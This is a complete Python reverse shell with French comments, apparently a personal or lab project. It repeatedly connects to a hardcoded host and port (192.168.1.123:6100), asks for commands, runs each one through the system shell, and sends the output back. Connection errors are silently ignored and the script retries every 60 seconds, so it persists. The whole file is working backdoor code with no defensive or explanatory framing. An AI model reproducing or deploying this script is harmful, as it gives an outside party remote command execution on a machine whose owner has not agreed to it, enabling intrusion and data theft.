######## Import ########
import os 
import time
import socket
import subprocess 


######Config######

Type_connexion = socket.SOCK_STREAM # TCP
Type_adresse = socket.AF_INET # IPv4
Adresse_cible = "192.168.1.123"
port_cible = 6100
Taille_commande = 1024
SLEEP_TIME = 60

########Socket########

while True:
    try : 
        s = socket.socket(Type_adresse,Type_connexion)
        s.settimeout(60)
        s.connect((Adresse_cible,port_cible))
        s.send(f"Connection sur {Adresse_cible} au port {port_cible}\n".encode())
        
        #----------------------------------------------------------------------#
        while True :
            s.send("<+>__<+> Tu peux envoyer tes lignes de code => ".encode())
            cmd_recu = s.recv(Taille_commande)
            if not cmd_recu or cmd_recu == "exit": # a revoir peut etre exit marche pas 
                    break
            cmd_recu = cmd_recu.decode().strip()
            #----------------------------------------------------------------------#
            if cmd_recu:
                try:
                    resultat = subprocess.check_output(cmd_recu, shell=True,stderr=subprocess.STDOUT) #stderr => Mélange les erreurs et les résultats classiques dans le même paquet
                except:
                    resultat = b"Erreur d'execution de la commande"
                s.send(resultat)
    except Exception :
        pass # sans ca si erreur de connexion  alors le code se relance pas et s'arrete vrmt 
    finally:
        s.close()

    time.sleep(SLEEP_TIME)
